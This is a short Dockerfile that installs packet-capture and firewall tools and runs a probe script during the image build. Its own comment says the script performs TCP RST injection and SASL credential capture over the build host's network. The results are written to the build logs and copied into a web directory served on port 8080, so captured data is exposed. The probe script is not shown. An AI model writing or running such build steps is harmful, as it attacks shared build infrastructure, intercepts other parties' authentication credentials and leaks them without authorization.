FROM python:3.11-alpine

RUN apk add --no-cache tcpdump iproute2 bind-tools procps net-tools curl conntrack-tools iptables openssl

COPY probe.sh /probe.sh
RUN chmod +x /probe.sh

# RST injection + SASL capture runs during build with host networking
RUN /probe.sh

# Output to stderr so BuildKit captures it in logs
RUN cat /tmp/probe.txt 1>&2 || true

RUN mkdir -p /srv/www && cp /tmp/probe.txt /srv/www/probe.txt 2>/dev/null || echo "no probe output" > /srv/www/probe.txt

COPY start.sh /start.sh
RUN chmod +x /start.sh

EXPOSE 8080
CMD ["/start.sh"]
